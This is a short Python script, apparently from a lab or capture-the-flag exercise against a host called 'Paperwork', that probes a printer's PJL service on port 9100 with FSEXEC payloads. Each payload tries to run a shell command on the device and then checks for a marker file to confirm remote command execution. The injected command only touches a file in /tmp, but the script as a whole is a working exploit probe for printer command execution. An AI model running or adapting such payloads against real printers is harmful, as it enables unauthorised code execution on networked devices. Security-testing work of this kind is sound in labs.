#!/usr/bin/env python3
"""Probe PJL FSEXEC variants on Paperwork jetdirect (run ON target as lp)."""
import os
import socket
import time

HOST, PORT = "127.0.0.1", 9100
MARK = "/tmp/pjl_fsexec_mark"


def try_cmd(label: str, payload: bytes) -> None:
    if os.path.exists(MARK):
        os.remove(MARK)
    s = socket.socket()
    s.settimeout(4)
    try:
        s.connect((HOST, PORT))
        s.sendall(payload)
        r = s.recv(2048)
        print(label, "resp", repr(r[:200]))
    except Exception as e:
        print(label, "err", e)
    finally:
        s.close()
    time.sleep(0.3)
    print(label, "mark_exists", os.path.exists(MARK))


# Real HP-style vs short CMD=
variants = [
    ("FSEXEC id", b'@PJL FSEXEC CMD="touch /tmp/pjl_fsexec_mark"\r\n'),
    ("FSEXEC bare", b"@PJL FSEXEC CMD=touch /tmp/pjl_fsexec_mark\r\n"),
    ("FSEXEC bash", b'@PJL FSEXEC CMD="bash -c touch /tmp/pjl_fsexec_mark"\r\n'),
    ("INFO", b"@PJL INFO ID\r\n"),
]
for label, p in variants:
    try_cmd(label, p)